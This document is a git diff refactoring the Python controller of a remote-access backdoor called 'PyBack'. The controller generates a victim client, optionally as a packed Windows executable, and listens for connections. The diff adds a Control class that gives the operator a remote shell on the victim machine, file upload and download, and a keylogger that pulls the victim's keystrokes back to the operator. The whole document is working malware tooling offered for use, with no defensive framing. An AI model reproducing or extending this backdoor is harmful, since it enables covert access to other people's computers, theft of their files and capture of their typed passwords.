@@ -1,13 +1,9 @@
 #!/usr/bin/python
 
-#import the required modules
+# import the required modules
 import socket
-import os
 import struct
-import shutil
-from distutils.core import setup
-import py2exe, sys, os
-
+import os
 
 
 ##############################################
@@ -19,22 +15,22 @@ import py2exe, sys, os
 ##############################################
 
 
-
-class Server(): #class Server: define the server properties
-    def __init__(self, client = None):
+class Server:  # class Server: define the server properties
+    def __init__(self, sock, client=None):
         self.client = client
 
-    def send(self, data): #custom send function
+    def send(self, data):  # custom send function
         pkt = struct.pack('>I', len(data)) + data
         self.client.sendall(pkt)
 
-    def recv(self): #custom recv function
+    def recv(self):  # custom recv function
         pktlen = self.recvall(4)
-        if not pktlen: return ""
+        if not pktlen:
+            return ""
         pktlen = struct.unpack('>I', pktlen)[0]
         return self.recvall(pktlen)
 
-    def recvall(self, n): #format the receipts packets
+    def recvall(self, n):  # format the receipts packets
         packet = b''
         while len(packet) < n:
             frame = self.client.recv(n - len(packet))
@@ -44,14 +40,103 @@ class Server(): #class Server: define the server properties
         return packet
 
 
+class Control(Server):
+
+    def __init__(self, sock, client):
+        super().__init__(sock, client)
+        self.sock = sock
+        self.client = client
+
+    @staticmethod
+    def help():  # help command: show the available commands
+        print(
+            """
+        Here are the different available commands:
+
+        \033[4mPyBack commands:\033[0m
+        - background: Put the client session in background.
+        - exit: Exit and kill the client session.
+        - remove: Remove all the files and kill the client session.
+
+        \033[4mExploit commands:\033[0m
+        - cmd: Open a shell on the client machine.
+        - upload: Upload a file to the client.
+        - download: Download a file from the client.
+        - keylogger [start/stop]: Start or stop a keylogger and get the file with the keylogs.
+        \n
+        """)
+
+    def exit(self):
+        self.send('exit'.encode())
+        self.client.close()
+        self.sock.close()
+        exit()
+
+    def remove(self):
+        self.send("remove".encode())
+        main_menu()
+
+    def upload(self):  # upload command: upload a file to the client
+        self.send("upload".encode())
+        local_path = input("Please enter the path of your local file: ")
+        try:
+            with open(local_path, 'rb') as file:
+                while True:
+                    a = file.read(1024)
+                    if not a:
+                        break
+                    self.send(a)
+            self.send(local_path.split('/')[-1].encode())
+            print('File sent successful!')
+        except FileNotFoundError:
+            print("File not found!")
+
+    def download(self):  # download command: download a file from the client
+        self.send("download".encode())
+        client_path = input("Please enter the path of the client file: ")
+        self.send(client_path.encode())
+        file_content = self.recv()
+        file_name = self.recv()
+        with open(file_name, 'wb') as file:
+            file.write(file_content)
+        print("File received successful!")
+
+    def cmd(self):  # cmd command: open a shell on the client machine
+        os.system(clear)
+        self.send('cmd'.encode())
+        while True:
+            directory = self.recv().decode()
+            cmd = input(directory + ' ')
+            if cmd != 'exit':
+                self.send(cmd.encode())
+                response = self.recv().decode('cp850').strip()
+                print(response)
+            else:
+                self.send('exit'.encode())
+                break
+
+    def keylogger(self, option):  # keylogger command: save the keystrokes from the client
+        self.send(f'keylogger {option}'.encode())
+        if option == 'stop':
+            print('Killing keylogger...')
+            keylogs = self.recv().decode()
+            with open('keylogs.txt', 'a') as file:
+                file.write(keylogs)
+            print("Keylogger is finished. All the keyboard logs are in the file 'keylogs.txt'.")
+        elif option == 'start':
+            print("Keylogger is starting...")
+
+    def background(self):
+        self.send("background".encode())
+        main_menu()
 
 
-def main_menu(): #define the main menu
+def main_menu():  # define the main menu
     while True:
         os.system(clear)
         print("""
         1. Create and configure a backdoor
-        2. Listen to a port and remote a backdoor
+        2. Listen to a port and control a backdoor
         3. Exit
         """)
         choice = input("\n Enter your choice: ")
@@ -63,163 +148,75 @@ def main_menu(): #define the main menu
             exit()
 
 
-def create(): #configure the client with ip and port
+def create():  # configure the client with ip and port
     os.system(clear)
-    HOST = input("Enter the host/ip of the client: ")
-    PORT = input("Enter the port of the client: ")
+    host = input("Enter the host/ip of the client: ")
+    port = input("Enter the port of the client: ")
     exe = input("Do you want to create an executable (y/n): ")
     with open('data/client.py', 'r', encoding='utf8') as file:
         content = file.readlines()
-    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{HOST}'\n"
-    content[content.index("PORT = 51025\n")] = f"PORT = {PORT}\n"
+    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{host}'\n"
+    content[content.index("PORT = 51025\n")] = f"PORT = {port}\n"
     with open('data/client.py', 'w', encoding='utf8') as file:
         file.write(''.join(content))
+
     if exe == 'y':
         os.system(clear)
         print('Creating the executable... This may take a while.')
-        sys.argv.append('py2exe')
-        setup(
-        options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
-        console = [{'script': "data/client.py"}],
-        zipfile = None,
-        )
-        print("Executable file succesfully created in folder 'exe'!\n")
+        os.system("pyinstaller -F data/client.py -c --distpath exe")
+        print("Executable file successfully created in folder 'exe'!\n")
     else:
-        print("Python file succesfully created!\n")
+        print("Python file successfully created!\n")
     os.system('pause')
 
 
-def listener(): #define the socket and listen for connections
-    HOST = input("Enter your host/ip: ")
-    PORT = int(input("Enter your port: "))
+def listener():  # define the socket and listen for connections
+    host = input("Enter your host/ip: ")
+    port = int(input("Enter your port: "))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind((HOST, PORT))
-    sock.listen(1)
-    print(f"\nServer {HOST} is listening on port {PORT}...")
+    sock.bind((host, port))
+    sock.listen()
+    print(f"\nServer {host} is listening on port {port}...")
     while True:
         client, address = sock.accept()
-        global server
-        server = Server(client)
+        control = Control(sock, client)
         print(f"Client {address[0]} on port {address[1]} is connected!")
         os.system('pause')
-        interpreter(sock, client)
+        interpreter(control)
 
 
-def interpreter(sock, client): #wait for commands and interpret them
+def interpreter(control):  # wait for commands and interpret them
     os.system(clear)
-    print("Enter a command or 'help', for a list of the availables commands")
+    print("Enter a command or 'help', for a list of the available commands")
     while True:
-        command = input('>>> ')
-        try:
-            if command == 'exit':
-                server.send('exit'.encode())
-                client.close()
-                sock.close()
-                exit()
+        string = input('>>> ')
+        command = string.split(' ')[0]
+        if command == 'help':
+            control.help()
+        elif command == 'exit':
+            control.exit()
+        elif command == 'remove':
+            control.remove()
+        elif command == 'background':
+            control.background()
+        elif command == 'cmd':
+            control.cmd()
+        elif command == 'upload':
+            control.upload()
+        elif command == 'download':
+            control.download()
+        elif command == 'keylogger':
+            if len(string.split()) == 1:
+                print("Please specify an option for the keylogger (start/stop).")
             else:
-                command = command.split(" ")
-                if len(command) > 1:
-                    exec(f"{command[0]}('{command[1]}')")
-                else:
-                    exec(f"{command[0]}()")
-        except NameError:
-            print("Command not found! Enter 'help' to see the availables commands.")
-
-
-
-def help(): #help command: show the availables commands
-    print(
-    """
-    Here are the differents availables commands:
-
-    \033[4mPyBack commands:\033[0m
-    - background: Put the client session in background.
-    - exit: Exit and kill the client session.
-    - remove: Remove all the files and kill the client session.
-
-    \033[4mExploit commands:\033[0m
-    - cmd: Open a shell on the client machine.
-    - upload: Upload a file to the client.
-    - download: Download a file from the client.
-    - keylogger [start/stop]: Start or stop a keylogger and get the file with the keylogs.
-    \n
-    """)
-
-
-
-def background():
-    server.send("background".encode())
-    main_menu()
-
-
-def remove():
-    server.send("remove".encode())
-    main_menu()
-
-
-
-def upload(): #upload command: upload a file to the client
-    server.send("upload".encode())
-    local_path = input("Please enter the path of your local file: ")
-    try:
-        with open(local_path, 'rb') as file:
-            while True:
-                a = file.read(1024)
-                if not a:
-                    break
-                server.send(a)
-        server.send(local_path.split('/')[-1].encode())
-        print('File sent succesful!')
-    except FileNotFoundError:
-        print("File not found!")
-
-
-def download(): #download command: download a file from the client
-    server.send("download".encode())
-    client_path = input("Please enter the path of the client file: ")
-    server.send(client_path.encode())
-    file_content = server.recv()
-    file_name = server.recv()
-    with open(file_name, 'wb') as file:
-        file.write(file_content)
-    print("File received succesful!")
-
-
-
-def cmd(): #cmd command: open a shell on the client machine
-    os.system(clear)
-    server.send('cmd'.encode())
-    while True: 
-        dir = server.recv().decode().strip()
-        cmd = input(dir + ' ')
-        if cmd != 'exit':
-            server.send(cmd.encode())
-            response = server.recv().decode('cp850').strip()
-            print(response)
+                control.keylogger(string.split()[1])
         else:
-            server.send('exit'.encode())
-            break
-
-
-
-def keylogger(option): #keylogger command: save the keystrokes from the client
-    server.send(f'keylogger {option}'.encode())
-    if option == 'stop':
-        print('Killing keylogger...')
-        keylogs = server.recv().decode()
-        with open('keylogs.txt', 'a') as file:
-            file.write(keylogs)
-        print("Keylogger is killed! All the keylogs are in the file 'keylogs.txt'.")
-    elif option == 'start':
-        print("Keylogger is starting...")
-
+            print("Command not found! Enter 'help' to see the available commands.")
 
 
 if os.name == 'nt':
     clear = 'cls'
-else :
+else:
     clear = 'clear'
 main_menu()
-
-    
